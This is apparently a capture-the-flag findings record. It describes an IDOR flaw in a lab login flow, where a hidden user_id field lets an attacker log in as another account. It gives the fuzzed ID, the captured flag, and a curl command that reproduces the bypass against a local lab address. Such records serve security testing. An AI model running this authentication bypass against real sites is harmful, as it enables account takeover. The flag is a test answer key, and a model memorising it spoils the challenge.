findings.title: IDOR in Login Flow - Flag Extracted
findings.description: The password verification endpoint /password/{username} uses the user_id submitted in the POST body (hidden form field) rather than looking up the user_id from the username in the URL. An attacker can submit any user_id with the known password 'test' to authenticate as that user. By fuzzing the user_id field with values near 10032, user_id=10001 was found to accept password='test' and belongs to the flag account.
findings.evidence:
POST /password/test with user_id=10001&password=test → 302 to /dashboard. Dashboard response: 'Welcome, Flag flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}'

The flag is: flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}

reproduction.command: curl -c cookies.txt -X POST http://172.17.0.1:56629/password/test -d 'username=test&user_id=10001&password=test' && curl -b cookies.txt http://172.17.0.1:56629/dashboard
